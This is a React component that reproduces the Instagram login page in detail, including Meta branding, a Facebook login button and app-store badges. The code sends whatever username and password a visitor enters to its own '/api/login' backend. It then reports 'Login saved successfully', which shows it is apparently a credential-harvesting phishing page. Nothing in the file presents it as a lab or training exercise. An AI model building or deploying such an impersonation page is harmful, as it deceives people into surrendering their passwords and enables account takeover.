import { useEffect, useState } from "react";

const styles = `
  @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Nunito:wght@300;400;600;700;800&display=swap');

  * { box-sizing: border-box; margin: 0; padding: 0; }

  .ig-body {
    min-height: 100vh;
    background: #fafafa;
    font-family: 'Nunito', sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
    position: relative;
    overflow: hidden;
  }

  .ig-body::before {
    content: '';
    position: fixed;
    inset: 0;
    background:
      radial-gradient(ellipse at 15% 50%, rgba(240,148,51,0.08) 0%, transparent 55%),
      radial-gradient(ellipse at 85% 20%, rgba(188,24,136,0.08) 0%, transparent 55%),
      radial-gradient(ellipse at 50% 90%, rgba(220,39,67,0.05) 0%, transparent 50%);
    pointer-events: none;
  }

  .ig-container {
    width: 100%;
    max-width: 350px;
    display: flex;
    flex-direction: column;
    gap: 10px;
    position: relative;
    z-index: 1;
  }

  .ig-card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
    padding: 40px 40px 24px;
    display: flex;
    flex-direction: column;
    align-items: center;
    animation: igFadeUp 0.5s ease both;
  }

  .ig-signup-card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
    padding: 20px;
    text-align: center;
    font-size: 0.87rem;
    color: #262626;
    animation: igFadeUp 0.5s 0.12s ease both;
  }

  .ig-signup-card a {
    color: #0095f6;
    font-weight: 700;
    text-decoration: none;
    cursor: pointer;
  }

  .ig-app-links {
    text-align: center;
    font-size: 0.82rem;
    color: #262626;
    animation: igFadeUp 0.5s 0.22s ease both;
  }

  .ig-app-links p { margin-bottom: 12px; }

  .ig-badges {
    display: flex;
    gap: 8px;
    justify-content: center;
  }

  .ig-badge {
    border: 1px solid #262626;
    border-radius: 6px;
    padding: 4px 14px;
    font-size: 0.72rem;
    font-family: 'Nunito', sans-serif;
    cursor: pointer;
    transition: background 0.2s;
  }
  .ig-badge:hover { background: #f0f0f0; }
  .ig-badge-sub { font-size: 0.6rem; }
  .ig-badge-main { font-weight: 700; font-size: 0.88em; }

  .ig-logo {
    font-family: 'Grand Hotel', cursive;
    font-size: 2.5rem;
    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    margin-bottom: 26px;
    letter-spacing: 1px;
    user-select: none;
  }

  .ig-alert {
    width: 100%;
    padding: 10px 12px;
    border-radius: 4px;
    font-size: 0.82rem;
    font-weight: 600;
    margin-bottom: 8px;
    animation: igFadeIn 0.3s ease;
  }

  .ig-alert-error   { background: #ffe0e0; color: #c0392b; }
  .ig-alert-success { background: #e0ffe0; color: #27ae60; }

  .ig-form {
    width: 100%;
    display: flex;
    flex-direction: column;
    gap: 6px;
  }

  .ig-input-wrap {
    position: relative;
    width: 100%;
  }

  .ig-input {
    width: 100%;
    padding: 9px 44px 9px 12px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    font-size: 0.82rem;
    font-family: 'Nunito', sans-serif;
    color: #262626;
    outline: none;
    transition: border-color 0.2s, background 0.2s;
  }

  .ig-input:focus {
    border-color: #a8a8a8;
    background: #fff;
  }

  .ig-input::placeholder { color: #8e8e8e; }

  .ig-show-btn {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    font-size: 0.75rem;
    font-weight: 700;
    color: #262626;
    cursor: pointer;
    font-family: 'Nunito', sans-serif;
    padding: 4px;
    transition: opacity 0.2s;
  }

  .ig-show-btn:hover { opacity: 0.6; }

  .ig-login-btn {
    margin-top: 6px;
    padding: 7px;
    background: #0095f6;
    color: #fff;
    font-family: 'Nunito', sans-serif;
    font-weight: 700;
    font-size: 0.9rem;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    transition: opacity 0.2s, transform 0.1s;
  }

  .ig-login-btn:hover:not(:disabled) { opacity: 0.85; }
  .ig-login-btn:active:not(:disabled) { transform: scale(0.98); }
  .ig-login-btn:disabled { opacity: 0.65; cursor: not-allowed; }

  .ig-divider {
    display: flex;
    align-items: center;
    gap: 16px;
    margin: 18px 0;
    width: 100%;
  }

  .ig-divider::before, .ig-divider::after {
    content: '';
    flex: 1;
    height: 1px;
    background: #dbdbdb;
  }

  .ig-divider span {
    font-size: 0.8rem;
    font-weight: 700;
    color: #8e8e8e;
    letter-spacing: 1px;
  }

  .ig-fb-login {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    color: #385185;
    font-weight: 700;
    font-size: 0.87rem;
    cursor: pointer;
    background: none;
    border: none;
    font-family: 'Nunito', sans-serif;
    transition: opacity 0.2s;
    width: 100%;
    padding: 4px;
  }

  .ig-fb-login:hover { opacity: 0.7; }

  .ig-forgot {
    margin-top: 16px;
    font-size: 0.75rem;
    color: #8e8e8e;
    text-align: center;
  }

  .ig-forgot a { color: #8e8e8e; text-decoration: none; cursor: pointer; }
  .ig-forgot a:hover { text-decoration: underline; }

  .ig-footer {
    margin-top: 48px;
    text-align: center;
    font-size: 0.72rem;
    color: #8e8e8e;
    animation: igFadeUp 0.5s 0.32s ease both;
  }

  .ig-footer-links {
    margin-bottom: 10px;
    flex-wrap: wrap;
    display: flex;
    justify-content: center;
    gap: 4px 0;
  }

  .ig-footer a { color: #8e8e8e; text-decoration: none; margin: 0 4px; }
  .ig-footer a:hover { text-decoration: underline; }

  .ig-spinner {
    width: 16px;
    height: 16px;
    border: 2px solid rgba(255,255,255,0.4);
    border-top-color: #fff;
    border-radius: 50%;
    animation: igSpin 0.7s linear infinite;
    display: inline-block;
    vertical-align: middle;
    margin-right: 6px;
  }

  @keyframes igFadeUp {
    from { opacity: 0; transform: translateY(18px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  @keyframes igFadeIn {
    from { opacity: 0; }
    to   { opacity: 1; }
  }

  @keyframes igSpin {
    to { transform: rotate(360deg); }
  }
`;

function FacebookIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="#385185">
      <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z" />
    </svg>
  );
}

export default function InstagramLogin() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [loading, setLoading]   = useState(false);
  const [alert, setAlert]       = useState(null);

  useEffect(() => {
    const tag = document.createElement("style");
    tag.innerHTML = styles;
    document.head.appendChild(tag);
    return () => document.head.removeChild(tag);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!username.trim() || !password) return;

    setLoading(true);
    setAlert(null);

    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: username.trim(), password }),
      });

      const data = await res.json();

      if (res.ok) {
        setAlert({ type: "success", msg: `Welcome back, ${data.username}! Login saved successfully.` });
        setUsername("");
        setPassword("");
      } else {
        setAlert({ type: "error", msg: data.message || "Sorry, your password was incorrect." });
      }
    } catch {
      setAlert({ type: "error", msg: "Unable to connect to server. Make sure the backend is running." });
    } finally {
      setLoading(false);
    }
  };

  const isValid = username.trim().length > 0 && password.length > 0;

  return (
    <div className="ig-body">
      <div className="ig-container">

        {/* Main Card */}
        <div className="ig-card">
          <div className="ig-logo">Instagram</div>

          {alert && (
            <div className={`ig-alert ig-alert-${alert.type}`}>
              {alert.msg}
            </div>
          )}

          <form className="ig-form" onSubmit={handleSubmit}>
            <div className="ig-input-wrap">
              <input
                className="ig-input"
                type="text"
                placeholder="Phone number, username, or email"
                autoComplete="username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
              />
            </div>

            <div className="ig-input-wrap">
              <input
                className="ig-input"
                type={showPass ? "text" : "password"}
                placeholder="Password"
                autoComplete="current-password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
              {password && (
                <button
                  type="button"
                  className="ig-show-btn"
                  onClick={() => setShowPass(!showPass)}
                >
                  {showPass ? "Hide" : "Show"}
                </button>
              )}
            </div>

            <button
              type="submit"
              className="ig-login-btn"
              disabled={!isValid || loading}
            >
              {loading && <span className="ig-spinner" />}
              {loading ? "Logging in..." : "Log In"}
            </button>
          </form>

          <div className="ig-divider"><span>OR</span></div>

          <button className="ig-fb-login" type="button">
            <FacebookIcon />
            Log in with Facebook
          </button>

          <p className="ig-forgot"><a href="#">Forgot password?</a></p>
        </div>

        {/* Sign Up Card */}
        <div className="ig-signup-card">
          Don't have an account? <a href="#">Sign up</a>
        </div>

        {/* App Download */}
        <div className="ig-app-links">
          <p>Get the app.</p>
          <div className="ig-badges">
            <div className="ig-badge">
              <div className="ig-badge-sub">Download on the</div>
              <div className="ig-badge-main">App Store</div>
            </div>
            <div className="ig-badge">
              <div className="ig-badge-sub">Get it on</div>
              <div className="ig-badge-main">Google Play</div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="ig-footer">
          <div className="ig-footer-links">
            {["Meta","About","Blog","Jobs","Help","API","Privacy","Terms","Locations","Instagram Lite"].map(l => (
              <a key={l} href="#">{l}</a>
            ))}
          </div>
          <div style={{ marginBottom: 6 }}>
            <a href="#">English</a> · <a href="#">Afrikaans</a> · <a href="#">Español</a>
          </div>
          <div>© 2024 Instagram from Meta</div>
        </footer>

      </div>
    </div>
  );
}